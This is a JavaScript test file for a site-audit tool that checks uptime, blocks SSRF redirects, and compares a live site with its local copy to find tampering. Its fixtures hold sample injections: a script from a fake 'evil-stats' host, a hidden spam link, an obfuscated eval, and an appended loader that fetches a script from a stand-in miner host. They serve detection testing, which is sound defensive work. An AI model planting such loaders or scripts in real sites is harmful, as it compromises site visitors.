// Self-test for Hosted live (lib/live.js) and the audit's live step. Everything runs against little servers on this
// PC: a made-up https://shop.example/ is sent to them with the `resolve` hook, so nothing leaves the PC.
// Run: node test/live.test.js   (no packages)
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const assert = require('assert');
const live = require('../../src/bridge/live');
const { runAudit } = require('../../src/bridge/audit');

let failures = 0;
const check = async (name, fn) => { try { await fn(); console.log('ok   ' + name); } catch (e) { failures++; console.log('FAIL ' + name + ': ' + e.message); } };
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'bridge-live-'));
// Removed however the test ends (a failed check or a crash too); a folder something still holds gets a few tries.
process.on('exit', () => { try { fs.rmSync(tmp, { recursive: true, force: true, maxRetries: 8, retryDelay: 250 }); } catch {} });
const w = (rel, text) => { const p = path.join(tmp, rel); fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, text); };

// A server that answers from a table { path: { status, headers, body, delay } }; logs when each request came.
function serve(table) {
  const log = [];
  const srv = http.createServer((req, res) => {
    const p = new URL(req.url, 'http://x').pathname;
    log.push({ path: p, at: Date.now(), host: req.headers.host });
    const t = table[p] || table['*'] || { status: 404, body: 'Not found', headers: { 'Content-Type': 'text/plain' } };
    setTimeout(() => { res.writeHead(t.status || 200, { 'Content-Type': 'text/html; charset=utf-8', ...(t.headers || {}) }); res.end(t.body || ''); }, t.delay || 0);
  });
  return new Promise(r => srv.listen(0, '127.0.0.1', () => r({ srv, port: srv.address().port, log, close: () => new Promise(c => srv.close(c)) })));
}
const GOOD_HEADERS = { 'Content-Security-Policy': "default-src 'self'; frame-ancestors 'none'", 'X-Content-Type-Options': 'nosniff', 'Strict-Transport-Security': 'max-age=31536000' };
const page = (body, head = '') => `<!DOCTYPE html><html><head><title>Shop</title>${head}<script src="/js/app.js"></script></head><body><nav><a href="/about.html">About</a> <a href="/menu.html">Menu</a></nav>${body}</body></html>`;

async function main() {
  // ---------- the address ----------
  await check('address: a bare domain becomes https', () => assert.strictEqual(live.parseLiveUrl('example.com').url, 'https://example.com/'));
  await check('address: empty clears it', () => assert.strictEqual(live.parseLiveUrl('  ').url, ''));
  await check('address: this PC / home network refused', () => {
    for (const a of ['localhost:8080', 'http://127.0.0.1/', '192.168.1.20', 'http://10.0.0.5', 'mypc.local']) assert(live.parseLiveUrl(a).error, a);
  });
  await check('address: no user name/password, no ftp, needs a dot', () => {
    assert(live.parseLiveUrl('https://me:pw@example.com').error);
    assert(live.parseLiveUrl('ftp://example.com').error);
    assert(live.parseLiveUrl('intranet').error);
  });
  await check('address: tests may allow this PC', () => assert.strictEqual(live.parseLiveUrl('http://127.0.0.1:9/', { allowLocal: true }).url, 'http://127.0.0.1:9/'));
  await check('a redirect to this PC / a private address is not followed (SSRF guard)', async () => {
    for (const to of ['http://127.0.0.1:9/', 'http://169.254.169.254/latest/meta-data/', 'http://192.168.0.1/']) {
      const s = await serve({ '*': { status: 302, headers: { Location: to } } });
      // No `resolve` and no allowLocal, so this is the real code path a hosted site takes; the first hop is the
      // local test server, but its redirect target must be refused.
      const r = await live.checkSite('http://127.0.0.1:' + s.port + '/', { retryMs: 10 });
      await s.close();
      assert(r.state === 'unsure' && /local or private/.test(r.reason), to + ' -> ' + JSON.stringify(r));
    }
  });

  // ---------- the lights ----------
  const site = await serve({
    '/': { body: page('<h1>Welcome</h1>'), headers: GOOD_HEADERS },
    '/down': { status: 503, body: 'x' },
    '/gone': { status: 404, body: 'x' },
    '/fw': { status: 403, body: '<html><head><title>Access Denied</title></head><body>blocked</body></html>' },
    '/suspended': { body: '<html><head><title>Account Suspended</title></head><body>This Account has been suspended.</body></html>' },
    '/parked': { body: '<html><head><title>example.net</title></head><body>This domain is for sale! Buy this domain.</body></html>' },
    '/default': { body: '<html><head><title>Apache2 Ubuntu Default Page: It works</title></head></html>' },
    '/slow': { body: page('slow'), delay: 700 },
    '/hang': { body: 'late', delay: 3000 },
    '/away': { status: 301, headers: { Location: 'https://elsewhere.example/' } },
    '/loop': { status: 302, headers: { Location: '/loop2' } }, '/loop2': { status: 302, headers: { Location: '/loop' } },
  });
  const other = await serve({ '*': { body: page('elsewhere') } });
  const resolve = u => ({ host: '127.0.0.1', port: u.hostname === 'elsewhere.example' ? other.port : u.hostname === 'closed.example' ? 9 : site.port });
  const light = async (p, extra = {}) => live.checkSite('https://shop.example' + p, { resolve, retryMs: 50, timeout: 1500, ...extra });
  await check('light: a normal page is up (green)', async () => { const r = await light('/'); assert.strictEqual(r.state, 'up', r.reason); });
  await check('light: 503 is down', async () => { const r = await light('/down'); assert.strictEqual(r.state, 'down'); assert(/503/.test(r.reason)); });
  await check('light: 404 home page is down', async () => assert.strictEqual((await light('/gone')).state, 'down'));
  await check('light: a firewall 403 is unsure, and says the host may block this PC', async () => { const r = await light('/fw'); assert.strictEqual(r.state, 'unsure'); assert(/firewall/.test(r.reason)); });
  await check('light: "account suspended" is down', async () => assert.strictEqual((await light('/suspended')).state, 'down'));
  await check('light: a parked domain is down', async () => assert.strictEqual((await light('/parked')).state, 'down'));
  await check('light: a default server page is unsure', async () => assert.strictEqual((await light('/default')).state, 'unsure'));
  await check('light: slow is unsure', async () => { const r = await light('/slow', { slowMs: 300 }); assert.strictEqual(r.state, 'unsure'); assert(/slow/.test(r.reason)); });
  await check('light: no answer in time is down, after asking twice', async () => {
    const before = site.log.filter(x => x.path === '/hang').length;
    const r = await light('/hang', { timeout: 400 });
    assert.strictEqual(r.state, 'down'); assert(/asked twice/.test(r.reason));
    assert.strictEqual(site.log.filter(x => x.path === '/hang').length - before, 2);
  });
  await check('light: sends visitors to another domain = unsure', async () => { const r = await light('/away'); assert.strictEqual(r.state, 'unsure'); assert(/elsewhere\.example/.test(r.reason)); });
  await check('light: a redirect loop is down', async () => assert.strictEqual((await light('/loop')).state, 'down'));
  await check('light: nothing listening is down (refused)', async () => { const r = await live.checkSite('https://closed.example/', { resolve, retryMs: 10 }); assert.strictEqual(r.state, 'down'); assert(r.net); });
  await check('light: plain http is unsure (Not secure)', async () => { const r = await live.checkSite('http://shop.example/', { resolve }); assert.strictEqual(r.state, 'unsure'); });
  await check('light: an expiring certificate is unsure', () => {
    const r = live.judge('https://shop.example/', { status: 200, body: page(''), headers: {}, ms: 100, finalUrl: 'https://shop.example/', cert: { days: 5, validTo: new Date().toISOString() } });
    assert.strictEqual(r.state, 'unsure'); assert(/5 days/.test(r.reason));
  });
  await check('light: an expired / wrong-name certificate is down; a missing chain is unsure', () => {
    assert.strictEqual(live.judge('https://a.example/', { error: { code: 'CERT_HAS_EXPIRED', message: '' } }).state, 'down');
    assert.strictEqual(live.judge('https://a.example/', { error: { code: 'ERR_TLS_CERT_ALTNAME_INVALID', message: '' } }).state, 'down');
    assert.strictEqual(live.judge('https://a.example/', { error: { code: 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', message: '' } }).state, 'unsure');
  });
  await site.close(); await other.close();

  // ---------- live vs local ----------
  // The project: an analytics tag that only the live server prints is NAMED in the project (fine); the injected
  // script host, the hidden spam link and the obfuscated inline script are not.
  const proj = path.join(tmp, 'shop');
  w('shop/index.php', '<?php if (getenv("LIVE")) echo \'<script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>\'; ?>\n' + page('<h1>Welcome</h1>'));
  w('shop/js/app.js', 'console.log("app");\n');
  const clean = page('<h1>Welcome</h1><p><a href="https://www.facebook.com/shop">Us on Facebook</a></p>');
  const injected = page('<h1>Welcome</h1><p><a href="https://www.facebook.com/shop">Us on Facebook</a></p>'
    + '<div style="position:absolute;left:-9999px"><a href="https://cheap-pills.example/buy">pills</a></div>'
    + '<p>See <a href="https://news.example/story">our story in the news</a></p>'
    + '<script>eval(atob("Y29uc29sZS5sb2coMSk="))</script>',
    '<script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script><script src="https://cdn.evil-stats.example/t.js"></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js"></script>');
  const localSite = await serve({ '/': { body: clean }, '/about.html': { body: page('About us') }, '/menu.html': { body: page('Menu') }, '/js/app.js': { body: 'console.log("app");\n', headers: { 'Content-Type': 'text/javascript' } } });
  const liveSite = await serve({
    '/': { body: injected, headers: GOOD_HEADERS }, '/about.html': { body: page('About us'), headers: GOOD_HEADERS }, '/menu.html': { body: page('Menu'), headers: GOOD_HEADERS },
    '/js/app.js': { body: 'console.log("app");\n;(function(){var s=document.createElement("script");s.src="https://miner.example/m.js";document.head.appendChild(s)})();', headers: { 'Content-Type': 'text/javascript' } },
    '/.env': { body: 'DB_PASS=hunter2\n', headers: { 'Content-Type': 'text/plain' } },
  });
  const liveResolve = () => ({ host: '127.0.0.1', port: liveSite.port });
  const localUrl = 'http://127.0.0.1:' + localSite.port + '/';
  const a = await runAudit(proj, localUrl, { liveUrl: 'https://shop.example/', resolve: liveResolve, gapMs: 120, minGapMs: 0 });
  const by = rule => a.findings.filter(f => f.rule === rule);
  const titles = a.findings.map(f => f.rule + ' ' + f.title).join('\n  ');
  await check('compare: injected outside script = High CMP-001', () => assert(by('CMP-001').some(f => /evil-stats/.test(f.title) && f.sev === 'High'), titles));
  await check('compare: hidden spam link = High CMP-002', () => assert(by('CMP-002').some(f => /cheap-pills/.test(f.title)), titles));
  await check('compare: a visible live-only link = Medium CMP-003 (could be content added on the live site)', () => assert(by('CMP-003').some(f => /news\.example/.test(f.title) && f.sev === 'Medium'), titles));
  await check('compare: obfuscated inline script only on live = High CMP-004', () => assert(by('CMP-004').some(f => f.sev === 'High'), titles));
  await check('compare: a same-path script that differs and reaches a new host = High CMP-005', () => assert(by('CMP-005').some(f => /miner\.example/.test(f.title)), titles));
  await check('compare: a live-only tag the project names (analytics) is a note, not a finding', () => {
    // the compare's own findings only: the project has no privacy page, so PRIV-005 naming the host is right
    assert(!a.findings.some(f => /^CMP-/.test(f.rule) && /googletagmanager/.test(f.title)), titles);
    assert(a.notes.some(n => /googletagmanager/.test(n) && /index\.php/.test(n)), a.notes.join('\n'));
  });
  await check('compare: what the host adds itself (Cloudflare beacon) is a note', () => assert(a.notes.some(n => /cloudflareinsights/.test(n)) && !a.findings.some(f => /cloudflareinsights/.test(f.title))));
  await check('compare: links both copies have (Facebook) are not reported', () => assert(!a.findings.some(f => /facebook/.test(f.title))));
  await check('compare: .env on the live site = Critical LIVE-010', () => assert(by('LIVE-010').some(f => /shop\.example/.test(f.where)), titles));
  await check('compare: http that does not move to https = LIVE-021', () => assert(by('LIVE-021').length === 1, titles));
  await check('compare: headers are judged on live (good there), not on localhost (bare dev server)', () => {
    assert(!a.findings.some(f => f.rule === 'LIVE-001' || f.rule === 'LIVE-003'), titles);
    assert(a.notes.some(n => /Headers were checked on the live site/.test(n)));
  });
  await check('compare: the pages linked from home were compared too', () => assert.deepStrictEqual(a.compare.pages.map(p => p.path), ['/', '/about.html', '/menu.html']));
  await check('compare: verdict is fix-first', () => assert.strictEqual(a.verdict, 'fix-first'));
  await check('compare: live requests are paced (never two within the gap)', () => {
    const t = liveSite.log.map(x => x.at).sort((x, y) => x - y);
    for (let i = 1; i < t.length; i++) assert(t[i] - t[i - 1] >= 100, 'two live requests ' + (t[i] - t[i - 1]) + ' ms apart');
  });
  await check('compare: the real pacing default is 5 s and cannot be set lower for a real site', async () => {
    const src = fs.readFileSync(path.join(__dirname, '..', '..', 'src', 'bridge', 'live.js'), 'utf8');
    assert(/o\.minGapMs == null \? 5000/.test(src) && /o\.gapMs == null \? 5000/.test(src));
    const srv = fs.readFileSync(path.join(__dirname, '..', '..', 'src', 'bridge', 'live-state.js'), 'utf8');
    assert(/const local = cfg\.DEMO \|\| isLocalHost\(/.test(srv),'server lowers the gap only for the demo or an address on this PC');
  });

  // The same live site with no local copy running: judged against the project's files only.
  const b = await runAudit(proj, null, { liveUrl: 'https://shop.example/', resolve: liveResolve, gapMs: 50, minGapMs: 0 });
  await check('no local copy: injected script still High (no project file names it)', () => assert(b.findings.some(f => f.rule === 'CMP-001' && /evil-stats/.test(f.title)), b.findings.map(f => f.title).join('\n')));
  await check('no local copy: Facebook link is now live-only and unnamed = Medium, not High', () => assert(b.findings.filter(f => /facebook/.test(f.title)).every(f => f.sev === 'Medium')));
  await check('no local copy: the report says what it compared against', () => assert.strictEqual(b.compare.localUrl, null));

  // A clean live copy that matches local: nothing from the compare.
  const same = await serve({ '/': { body: clean, headers: GOOD_HEADERS }, '/about.html': { body: page('About us'), headers: GOOD_HEADERS }, '/menu.html': { body: page('Menu'), headers: GOOD_HEADERS }, '/js/app.js': { body: 'console.log("app");\n' } });
  const c = await runAudit(proj, localUrl, { liveUrl: 'https://shop.example/', resolve: () => ({ host: '127.0.0.1', port: same.port }), gapMs: 30, minGapMs: 0 });
  await check('clean live = local: no compare findings', () => assert(!c.findings.some(f => /^CMP-/.test(f.rule)), c.findings.map(f => f.rule + ' ' + f.title).join('\n')));
  await check('clean live = local: same script noted as the same', () => assert(c.notes.some(n => /\/js\/app\.js: the live file is the same/.test(n)), c.notes.join('\n')));

  // A firewall page stops the compare at once, and nothing is judged from it.
  const wall = await serve({ '*': { status: 403, body: '<html><head><title>Unauthorized Access</title></head><body>Your IP has been blocked</body></html>' } });
  const d = await runAudit(proj, localUrl, { liveUrl: 'https://shop.example/', resolve: () => ({ host: '127.0.0.1', port: wall.port }), gapMs: 30, minGapMs: 0 });
  await check('firewall page: compare stops after one request, no live findings', () => {
    assert(d.compare.stopped && /firewall/.test(d.compare.stopped));
    assert.strictEqual(wall.log.length, 1);
    assert(!d.findings.some(f => /^(CMP|LIVE-0[12])/.test(f.rule)));
  });
  // Blocked half-way: the pages after the block are not fetched.
  let n = 0;
  const flaky = await serve({ '*': { body: '' } });
  flaky.srv.removeAllListeners('request');
  flaky.srv.on('request', (req, res) => { n++; if (n === 1) { res.writeHead(200, GOOD_HEADERS); return res.end(clean); } res.writeHead(429); res.end('slow down'); });
  const e = await runAudit(proj, localUrl, { liveUrl: 'https://shop.example/', resolve: () => ({ host: '127.0.0.1', port: flaky.port }), gapMs: 30, minGapMs: 0 });
  await check('429 half-way: stops there', () => { assert(e.compare.stopped); assert.strictEqual(n, 2); });

  // ---------- live checks added from the audit registers (weak CSP, /admin/ over http, an old copy at /old/) ----------
  const proj2 = path.join(tmp, 'shop2');
  w('shop2/public_html/index.php', page('<h1>Welcome</h1>'));
  w('shop2/public_html/admin/.htaccess', 'RewriteEngine On\n');
  const httpSide = await serve({ '/': { status: 301, headers: { Location: 'https://shop.example/' } }, '/admin/': { body: '<html><head><title>Admin sign in</title></head></html>' } });
  const weak = await serve({
    '/': { body: page('<h1>Welcome</h1>'), headers: { ...GOOD_HEADERS, 'Content-Security-Policy': "frame-ancestors 'none'" } },
    '/about.html': { body: page('About us'), headers: GOOD_HEADERS }, '/menu.html': { body: page('Menu'), headers: GOOD_HEADERS },
    '/old/': { body: '<html><head><title>Shop (2019)</title></head><body>old</body></html>' },
  });
  const byProto = u => ({ host: '127.0.0.1', port: u.protocol === 'http:' ? httpSide.port : weak.port });
  const g = await runAudit(proj2, null, { liveUrl: 'https://shop.example/', resolve: byProto, gapMs: 30, minGapMs: 0 });
  const gr = g.findings.map(f => f.rule + ' ' + f.title).join('\n  ');
  await check('a CSP with only frame-ancestors = LIVE-008 (present is not enough)', () => assert(g.findings.some(f => f.rule === 'LIVE-008'), gr));
  await check('http:// moves to https at /, but /admin/ (own .htaccess) stays on http = LIVE-021', () => assert(g.findings.some(f => f.rule === 'LIVE-021' && /\/admin\//.test(f.where)), gr));
  await check('an old copy served at /old/ = LIVE-019', () => assert(g.findings.some(f => f.rule === 'LIVE-019' && /2019/.test(f.title)), gr));
  const spa = await serve({ '*': { body: page('<h1>Welcome</h1>'), headers: GOOD_HEADERS } });
  const h2 = await runAudit(proj2, null, { liveUrl: 'https://shop.example/', resolve: () => ({ host: '127.0.0.1', port: spa.port }), gapMs: 30, minGapMs: 0, maxPages: 1 });
  await check('an app that answers every address with its home page is not an "old copy"', () => assert(!h2.findings.some(f => f.rule === 'LIVE-019'), h2.findings.map(f => f.rule).join(',')));
  for (const s of [httpSide, weak, spa]) await s.close();

  // ---------- reading pages ----------
  await check('pageRefs: a // comment in an inline script is not a host', () => {
    const r = live.pageRefs('<script>//window.foo = 1\nvar a = 1;</script>', 'https://shop.example/');
    assert(!r.some(x => x.host === 'window.foo'));
  });
  await check('pageRefs: a link inside <div hidden> is hidden; a normal one is not', () => {
    const r = live.pageRefs('<div hidden><a href="https://x.example/">x</a></div><a href="https://y.example/">y</a>', 'https://shop.example/');
    assert(r.find(x => x.host === 'x.example').hidden && !r.find(x => x.host === 'y.example').hidden);
  });
  await check('same site: sub-domains and .com.au twins count as the site', () => {
    assert(live.isOwn('cdn.shop.com.au', 'www.shop.com.au'));
    assert(live.isOwn('shop.example', 'www.shop.example'));
    assert(!live.isOwn('evil.com.au', 'www.shop.com.au'));
  });

  for (const s of [localSite, liveSite, same, wall, flaky]) await s.close();
  fs.rmSync(tmp, { recursive: true, force: true });
  console.log(failures ? failures + ' FAILED' : 'all passed');
  process.exit(failures ? 1 : 0);
}
main().catch(e => { console.error(e); process.exit(1); });
